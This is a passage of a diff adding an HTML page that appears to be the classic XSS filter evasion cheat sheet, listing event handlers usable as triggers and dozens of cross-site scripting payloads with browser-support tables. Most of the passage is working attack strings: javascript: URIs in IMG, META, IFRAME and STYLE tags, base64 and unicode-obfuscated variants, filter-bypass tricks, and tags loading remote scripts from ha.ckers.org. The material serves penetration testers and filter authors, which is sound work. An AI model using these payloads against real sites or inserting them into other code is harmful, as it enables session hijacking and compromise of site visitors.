+15.	onBlur() (in the case where another popup is loaded and window looses focus)
+16.	onBounce() (fires when the behavior property of the marquee object is set to "alternate" and the contents of the marquee reach one side of the window)
+17.	onCellChange() (fires when data changes in the data provider)
+18.	onChange() (select, text, or TEXTAREA field loses focus and its value has been modified)
+19.	onClick() (someone clicks on a form)
+20.	onContextMenu() (user would need to right click on attack area)
+21.	onControlSelect() (fires when the user is about to make a control selection of the object)
+22.	onCopy() (user needs to copy something or it can be exploited using the execCommand("Copy") command)
+23.	onCut() (user needs to copy something or it can be exploited using the execCommand("Cut") command)
+24.	onDataAvailable() (user would need to change data in an element, or attacker could perform the same function)
+25.	onDataSetChanged() (fires when the data set exposed by a data source object changes)
+26.	onDataSetComplete() (fires to indicate that all data is available from the data source object)
+27.	onDblClick() (user double-clicks a form element or a link)
+28.	onDeactivate() (fires when the activeElement is changed from the current object to another object in the parent document)
+29.	onDrag() (requires that the user drags an object)
+30.	onDragEnd() (requires that the user drags an object)
+31.	onDragLeave() (requires that the user drags an object off a valid location)
+32.	onDragEnter() (requires that the user drags an object into a valid location)
+33.	onDragOver() (requires that the user drags an object into a valid location)
+34.	onDragDrop() (user drops an object (e.g. file) onto the browser window)
+35.	onDrop() (user drops an object (e.g. file) onto the browser window)
+36.	onEnd() (the onEnd event fires when the timeline ends.  This can be exploited, like most of the HTML+TIME event handlers by doing something like &lt;P STYLE="behavior:url('#default#time2')" onEnd="alert('XSS')"&gt;)
+37.	onError() (loading of a document or image causes an error)
+38.	onErrorUpdate() (fires on a databound object when an error occurs while updating the associated data in the data source object)
+39.	onFilterChange() (fires when a visual filter completes state change)
+40.	onFinish() (attacker can create the exploit when marquee is finished looping)
+41.	onFocus() (attacker executes the attack string when the window gets focus)
+42.	onFocusIn() (attacker executes the attack string when window gets focus)
+43.	onFocusOut() (attacker executes the attack string when window looses focus)
+44.	onHelp() (attacker executes the attack string when users hits F1 while the window is in focus)
+45.	onKeyDown() (user depresses a key)
+46.	onKeyPress() (user presses or holds down a key)
+47.	onKeyUp() (user releases a key)
+48.	onLayoutComplete() (user would have to print or print preview)
+49.	onLoad() (attacker executes the attack string after the window loads)
+50.	onLoseCapture() (can be exploited by the releaseCapture() method)
+51.	onMediaComplete() (When a streaming media file is used, this event could fire before the file starts playing)
+52.	onMediaError() (User opens a page in the browser that contains a media file, and the event fires when there is a problem)
+53.	onMouseDown() (the attacker would need to get the user to click on an image)
+54.	onMouseEnter() (cursor moves over an object or area)
+55.	onMouseLeave() (the attacker would need to get the user to mouse over an image or table and then off again)
+56.	onMouseMove() (the attacker would need to get the user to mouse over an image or table)
+57.	onMouseOut() (the attacker would need to get the user to mouse over an image or table and then off again)
+58.	onMouseOver() (cursor moves over an object or area)
+59.	onMouseUp() (the attacker would need to get the user to click on an image)
+60.	onMouseWheel() (the attacker would need to get the user to use their mouse wheel)
+61.	onMove() (user or attacker would move the page)
+62.	onMoveEnd() (user or attacker would move the page)
+63.	onMoveStart() (user or attacker would move the page)
+64.	onOutOfSync() (interrupt the element's ability to play its media as defined by the timeline)
+65.	onPaste() (user would need to paste or attacker could use the execCommand("Paste") function)
+66.	onPause() (the onpause event fires on every element that is active when the timeline pauses, including the body element)
+67.	onProgress() (attacker would use this as a flash movie was loading)
+68.	onPropertyChange() (user or attacker would need to change an element property)
+69.	onReadyStateChange() (user or attacker would need to change an element property)
+70.	onRepeat() (the event fires once for each repetition of the timeline, excluding the first full cycle)
+71.	onReset() (user or attacker resets a form)
+72.	onResize() (user would resize the window; attacker could auto initialize with something like: &lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;)
+73.	onResizeEnd() (user would resize the window; attacker could auto initialize with something like: &lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;)
+74.	onResizeStart() (user would resize the window; attacker could auto initialize with something like: &lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;)
+75.	onResume() (the onresume event fires on every element that becomes active when the timeline resumes, including the body element)
+76.	onReverse() (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)
+77.	onRowsEnter() (user or attacker would need to change a row in a data source)
+78.	onRowExit() (user or attacker would need to change a row in a data source)
+79.	onRowDelete() (user or attacker would need to delete a row in a data source)
+80.	onRowInserted() (user or attacker would need to insert a row in a data source)
+81.	onScroll() (user would need to scroll, or attacker could use the scrollBy() function)
+82.	onSeek() (the onreverse event fires when the timeline is set to play in any direction other than forward)
+83.	onSelect() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand("SelectAll");)
+84.	onSelectionChange() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand("SelectAll");)
+85.	onSelectStart() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand("SelectAll");)
+86.	onStart() (fires at the beginning of each marquee loop)
+87.	onStop() (user would need to press the stop button or leave the webpage)
+88.	onSyncRestored() (user interrupts the element's ability to play its media as defined by the timeline to fire)
+89.	onSubmit() (requires attacker or user submits a form)
+90.	onTimeError() (user or attacker sets a time property, such as dur, to an invalid value)
+91.	onTrackChange() (user or attacker changes track in a playList)
+92.	onUnload() (as the user clicks any link or presses the back button or attacker forces a click)
+93.	onURLFlip() (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file)
+94.	seekSegmentTime() (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)
+</TEXTAREA><BR><BR><BR>
+
+<A NAME="XSS_IMG_Dynsrc">IMG Dynsrc</A>:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG DYNSRC="javascript:alert('XSS')"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_IMG_lowsrc">IMG lowsrc</A>:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG LOWSRC="javascript:alert('XSS')"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_BGSOUND">BGSOUND</A>:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;BGSOUND SRC="javascript:alert('XSS');"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="ns">IE6.0</span>|<span class="ns">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_ampersand">& JavaScript includes</A> (works in Netscape 4.x):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;BR SIZE="&{alert('XSS')}"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="ns">IE6.0</span>|<span class="ns">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>] [<span class="s">NS4</span>]</DIV><BR><BR>
+
+<A NAME="XSS_LAYER">LAYER</A> (also only works in Netscape 4.x)<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;LAYER SRC="http://ha.ckers.org/scriptlet.html"&gt;&lt;/LAYER&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="ns">IE6.0</span>|<span class="ns">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>] [<span class="s">NS4</span>]</DIV><BR><BR>
+
+<A NAME="XSS_STYLE_sheet">STYLE sheet</A>:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Remote_style_sheet">Remote style sheet</A> (using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression.)  This only works in IE and Netscape 8.1+ in IE rendering engine mode.  Notice that there is nothing on the page to show that there is included JavaScript.  Note:  With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Remote_style_sheet_part_2">Remote style sheet part 2</A> (this works the same as above, but uses a &LT;STYLE&GT; tag instead of a &LT;LINK&GT; tag).  A slight variation on this vector was used to <A HREF="http://www.hacker.co.il/security/ie/css_import.html">hack Google Desktop</A>.  As a side note, you can remove the end &lt;/STYLE&gt; tag if there is HTML immediately after the vector to close it.  This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Remote_style_sheet_part_3">Remote style sheet part 3</A>. This only works in Opera 8.0 (no longer in 9.x) but is fairly tricky.  According to <A HREF="http://www.faqs.org/rfcs/rfc2616.html">RFC2616</A> setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera).  The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: &lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;META HTTP-EQUIV="Link" Content="&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="ns">IE6.0</span>|<span class="ns">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Remote_style_sheet_part_4">Remote style sheet part 4</A>.  This only works in Gecko rendering engines and works by binding an XUL file to the parent page.  I think the irony here is that Netscape assumes that Gecko is safer and therefor is vulnerable to this for the vast majority of sites:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;STYLE&gt;BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}&lt;/STYLE&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="ns">IE6.0</span>|<span class="ns">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Local_htc_file">Local htc file</A>.  This is a little different than the above two cross site scripting vectors because it uses an .htc file which must be on the same server as the XSS vector.  The example file works by pulling in the JavaScript and running it as part of the style attribute:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;XSS STYLE="behavior: url(xss.htc);"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_List-style-image">List-style-image</A>.  Fairly esoteric issue dealing with embedding images for bulleted lists.  This will only work in the IE rendering engine because of the JavaScript directive.  Not a particularly useful cross site scripting vector:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_VBscript">VBscript</A> in an image:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG SRC='vbscript:msgbox("XSS")'&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Mocha">Mocha</A> (older versions of Netscape only):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG SRC="mocha:[code]"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="ns">IE6.0</span>|<span class="ns">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>] [<span class="s">NS4</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Livescript">Livescript</A> (older versions of Netscape only):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG SRC="livescript:[code]"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="ns">IE6.0</span>|<span class="ns">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>] [<span class="s">NS4</span>]</DIV><BR><BR>
+
+<A NAME="XSS_US-ASCII">US-ASCII</A> encoding (found by <A HREF="http://www.iku-ag.de/">Kurt Huwig</A>).  This uses malformed ASCII encoding with 7 bits instead of 8.  This XSS may bypass many content filters but only works if the host transmits in US-ASCII encoding, or if you set the encoding yourself.  This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion.  Apache Tomcat is the only known server that transmits in US-ASCII encoding.  I highly suggest anyone interested in alternate encoding issues look at <A HREF="http://ha.ckers.org/charsets.html">my charsets issues</A> page:<BR>
+<TEXTAREA COLS=45 ROWS=3>¼script¾alert(¢XSS¢)¼/script¾</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>] [<span class="ns">NS4</span>]</DIV><BR><BR>
+
+<A NAME="XSS_META">META</A> (the odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_META_using_data_directive">META using data: directive</A> URL scheme.  This is nice because it also doesn't have anything visibly that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding.  Please see <A HREF="http://www.ietf.org/rfc/rfc2397.txt">RFC 2397</A> for more details or go <A HREF="http://software.hixie.ch/utilities/cgi/data/data">here</A> or <A HREF="http://www.scalora.org/projects/uriencoder/">here</A> to encode your own.  You can also use the <A HREF="#XSScalc">XSS calculator</A> below if you just want to encode raw HTML or JavaScript as it has a Base64 encoding method:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="ns">IE6.0</span>|<span class="ns">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_META_additional_URL_parameter">META with additional URL parameter</A>.  If the target website attempts to see if the URL contains "http://" at the beginning you can evade it with the following technique (Submitted by <A HREF="http://www.moritz-naumann.com">Moritz Naumann</A>):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_IFRAME">IFRAME</A> (if iframes are allowed there are a lot of other XSS problems as well):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_FRAME">FRAME</A> (frames have the same sorts of XSS problems as iframes):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert('XSS');"&gt;&lt;/FRAMESET&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="s">NS8.1-G</span>|<span class="s">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_TABLE">TABLE</A> (who would have thought tables were XSS targets... except me, of course):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_TD">TD</A> (just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:alert('XSS')"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+
+<A NAME="XSS_DIV_background-image">DIV background-image</A>:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_DIV_background_image_unicode">DIV background-image with unicoded XSS</A> exploit (this has been modified slightly to obfuscate the url parameter).  The original vulnerability was found by <A HREF="http://www.sysdream.com">Renaud Lifchitz</A> as a vulnerability in Hotmail:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_DIV_background-image_plus">DIV background-image plus extra characters</A>.  I built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course.  (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_DIV_expression">DIV expression</A> - a variant of this was effective against a real world cross site scripting filter using a newline between the colon and "expression":<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_STYLE">STYLE</A> tags with broken up JavaScript for XSS (this XSS at times sends IE into an infinite loop of alerts):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_STYLE_comment">STYLE attribute using a comment</A> to break up expression (Thanks to <A HREF="http://www.pixel-apes.com/">Roman Ivanov</A> for this one):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Anonymous_HTML">Anonymous HTML with STYLE attribute</A> (IE6.0 and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;XSS STYLE="xss:expression(alert('XSS'))"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_IMG_STYLE_expression">IMG STYLE with expression</A> (this is really a hybrid of the above XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like above this can send IE into a loop):<BR>
+<TEXTAREA COLS=45 ROWS=3>exp/*&lt;A STYLE='no\xss:noxss("*//*");
+xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_STYLE_tag">STYLE tag</A> (Older versions of Netscape only):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;STYLE TYPE="text/javascript"&gt;alert('XSS');&lt;/STYLE&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="ns">IE6.0</span>|<span class="ns">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>] [<span class="s">NS4</span>]</DIV><BR><BR>
+
+<A NAME="XSS_STYLE_background-image">STYLE tag using background-image</A>:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;STYLE&gt;.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_STYLE_background">STYLE tag using background</A>:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_Downlevel-Hidden">Downlevel-Hidden</A> block (only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode).  Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our Cross Site Scripting vector.  Or the system could add comment tags around something to attempt to render it harmless.  As we can see, that probably wouldn't do the job:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;!--[if gte IE 4]&gt;
+&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
+&lt;![endif]--&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="s">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_BASE">BASE</A> tag.  Works in IE and Netscape 8.1 in safe mode.  You need the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render.  Also, this relies on the fact that the website uses dynamically placed images like "images/image.jpg" rather than full paths.  If the path includes a leading forward slash like "/images/image.jpg" you can remove one slash from this vector (as long as there are two to begin the comment this will work):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;BASE HREF="javascript:alert('XSS');//"&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="s">IE6.0</span>|<span class="s">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="ns">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_OBJECT">OBJECT</A> tag (if they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag).  The linked file is actually an HTML file that can contain your XSS:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"&gt;&lt;/OBJECT&gt;</TEXTAREA><BR>
+<DIV ALIGN="CENTER">Browser support: [<span class="ns">IE7.0</span>|<span class="ns">IE6.0</span>|<span class="ns">NS8.1-IE</span>] [<span class="ns">NS8.1-G</span>|<span class="ns">FF2.0</span>] [<span class="s">O9.02</span>]</DIV><BR><BR>
+
+<A NAME="XSS_OBJECT_direct">Using an OBJECT tag</A> you can embed XSS directly (this is unverified so no browser support is added):<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert('XSS')&gt;&lt;/OBJECT&gt;</TEXTAREA><BR><BR><BR>
+
+<A NAME="XSS_Flash">Using an EMBED tag</A> you can embed a Flash movie that contains XSS.  <A HREF="http://ha.ckers.org/weird/xssflash.html">Click here for a demo</A>.  If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:<BR>
+<TEXTAREA COLS=45 ROWS=3>&lt;EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;</TEXTAREA><BR>
